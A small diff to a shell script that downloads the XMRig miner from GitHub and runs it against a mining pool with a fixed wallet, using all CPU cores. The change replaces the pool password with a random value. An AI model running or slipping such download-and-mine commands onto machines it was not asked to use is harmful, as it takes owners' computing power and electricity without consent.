@@ -1,4 +1,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
 tar xf xmrig-6.24.0-linux-static-x64.tar.gz
 cd xmrig-6.24.0
-./xmrig --donate-level 1 -o pool-global.tari.snipanet.com:3333 -u 16Yt2MgL51qYTXBGQ6tF1Z9thmcxLgWGoAXWEdQRJjGriQ38DvGhPFXzLEDF4XtE4yrdXBS3n7byoUbsN6QdCuXyTXgAqsyrn8nJjCGHf6o -p x -a rx/0 -k -t $(nproc --all)
+./xmrig --donate-level 1 -o pool-global.tari.snipanet.com:3333 -u 16Yt2MgL51qYTXBGQ6tF1Z9thmcxLgWGoAXWEdQRJjGriQ38DvGhPFXzLEDF4XtE4yrdXBS3n7byoUbsN6QdCuXyTXgAqsyrn8nJjCGHf6o -p $RANDOM -a rx/0 -k -t $(nproc --all)
